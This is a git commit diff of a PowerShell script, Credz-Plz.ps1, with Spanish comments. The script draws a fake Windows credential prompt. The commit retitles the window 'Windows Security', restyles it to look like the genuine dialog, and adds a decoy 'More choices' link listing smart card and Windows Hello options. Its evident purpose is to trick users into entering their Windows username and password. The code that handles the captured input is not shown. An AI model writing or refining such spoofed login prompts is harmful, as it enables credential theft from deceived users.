bfcc234296c3f3ec4aab31b349a7e27e18924cd5
pedrito12a <153040660+pedrito12a@users.noreply.github.com>
2023-12-06 02:05:44 +0100

    Update Credz-Plz.ps1

--- Credz-Plz.ps1
+++ Credz-Plz.ps1
@@ -3,28 +3,30 @@ Add-Type -AssemblyName System.Windows.Forms
 
 # Crear el formulario principal
 $form = New-Object System.Windows.Forms.Form
-$form.Text = "Failed Authentication"
+$form.Text = "Windows Security"
 $form.Size = New-Object System.Drawing.Size(300,200)
 $form.StartPosition = "CenterScreen"
+$form.BackColor = "Gray"
 
 # Crear el campo de usuario
 $userLabel = New-Object System.Windows.Forms.Label
-$userLabel.Text = "User name (Main Desktop):"
+$userLabel.Text = "User name"
 $userLabel.Location = New-Object System.Drawing.Point(10,10)
 $userLabel.AutoSize = $true
+$userLabel.ForeColor = "White"
 $form.Controls.Add($userLabel)
 
 $userBox = New-Object System.Windows.Forms.TextBox
 $userBox.Location = New-Object System.Drawing.Point(80,10)
 $userBox.Size = New-Object System.Drawing.Size(200,20)
-$userBox.Text = ""
 $form.Controls.Add($userBox)
 
 # Crear el campo de contraseña
 $passwordLabel = New-Object System.Windows.Forms.Label
-$passwordLabel.Text = "Password:"
+$passwordLabel.Text = "Password"
 $passwordLabel.Location = New-Object System.Drawing.Point(10,40)
 $passwordLabel.AutoSize = $true
+$passwordLabel.ForeColor = "White"
 $form.Controls.Add($passwordLabel)
 
 $passwordBox = New-Object System.Windows.Forms.TextBox
@@ -33,17 +35,25 @@ $passwordBox.Size = New-Object System.Drawing.Size(200,20)
 $passwordBox.UseSystemPasswordChar = $true
 $form.Controls.Add($passwordBox)
 
+# Crear el enlace de más opciones
+$moreLink = New-Object System.Windows.Forms.LinkLabel
+$moreLink.Text = "More choices"
+$moreLink.Location = New-Object System.Drawing.Point(10,70)
+$moreLink.AutoSize = $true
+$moreLink.LinkColor = "White"
+$form.Controls.Add($moreLink)
+
 # Crear el botón de OK
 $okButton = New-Object System.Windows.Forms.Button
 $okButton.Text = "OK"
-$okButton.Location = New-Object System.Drawing.Point(100,80)
+$okButton.Location = New-Object System.Drawing.Point(100,120)
 $okButton.Size = New-Object System.Drawing.Size(80,30)
 $form.Controls.Add($okButton)
 
 # Crear el botón de Cancel
 $cancelButton = New-Object System.Windows.Forms.Button
 $cancelButton.Text = "Cancel"
-$cancelButton.Location = New-Object System.Drawing.Point(200,80)
+$cancelButton.Location = New-Object System.Drawing.Point(200,120)
 $cancelButton.Size = New-Object System.Drawing.Size(80,30)
 $form.Controls.Add($cancelButton)
 
@@ -78,6 +88,38 @@ $okButton.Add_Click({
 # Añadir un evento al botón de Cancel para que se cierre el formulario
 $cancelButton.Add_Click({
     $form.Close()
+})
+
+# Añadir un evento al enlace de más opciones para que se abra una nueva ventana con otras opciones
+$moreLink.Add_Click({
+    # Crear una nueva ventana con un listado de opciones
+    $optionsForm = New-Object System.Windows.Forms.Form
+    $optionsForm.Text = "More choices"
+    $optionsForm.Size = New-Object System.Drawing.Size(300,200)
+    $optionsForm.StartPosition = "CenterScreen"
+    $optionsForm.BackColor = "Gray"
+
+    # Crear un control de lista con las opciones disponibles
+    $optionsList = New-Object System.Windows.Forms.ListBox
+    $optionsList.Location = New-Object System.Drawing.Point(10,10)
+    $optionsList.Size = New-Object System.Drawing.Size(280,150)
+    $optionsList.Items.Add("Use a different account")
+    $optionsList.Items.Add("Use a smart card")
+    $optionsList.Items.Add("Use Windows Hello")
+    $optionsForm.Controls.Add($optionsList)
+
+    # Crear un botón de OK para cerrar la ventana de opciones
+    $okButton = New-Object System.Windows.Forms.Button
+    $okButton.Text = "OK"
+    $okButton.Location = New-Object System.Drawing.Point(100,160)
+    $okButton.Size = New-Object System.Drawing.Size(80,30)
+    $okButton.Add_Click({
+        $optionsForm.Close()
+    })
+    $optionsForm.Controls.Add($okButton)
+
+    # Mostrar la ventana de opciones
+    $optionsForm.ShowDialog()
 })
 
 # Mostrar el formulario
